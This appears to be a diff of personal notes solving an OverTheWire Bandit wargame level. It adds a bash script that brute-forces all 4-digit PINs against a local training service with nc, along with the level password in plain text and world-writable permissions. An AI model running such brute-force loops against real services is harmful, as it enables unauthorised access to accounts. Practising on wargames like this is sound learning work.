@@ -125,5 +125,26 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 (bandit 24 to 25)
 mkdir /tmp/my_crunch; chmod 777 !$; cd !$
-vim script.sh
-chmod +x !$; chmod 777 !$
+vim script.sh; chmod +x !$; chmod 777 !$
+  #! /bin/bash
+  bandit24_pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+  pin="0"
+  pins="00"
+  pinss="000"
+  for i in {0..9999}; do
+    if [[ i -lt 1000 ]]; then
+      if [[ i -lt 100 ]]; then
+        if [[ i -lt 10 ]]; then
+          echo $bandit24_pass $pinss$i | nc localhost 30002 >> data
+          # Try the nc [-N] option to close the connection automically
+        else
+          echo $bandit24_pass $pins$i | nc localhost 30002 >> data
+        fi
+      else
+        echo $bandit24_pass $pin$i | nc localhost 30002 >> data
+      fi
+    else
+      echo $bandit24_pass $i | nc localhost 30002 >> data
+   fi
+  done
+./script.sh
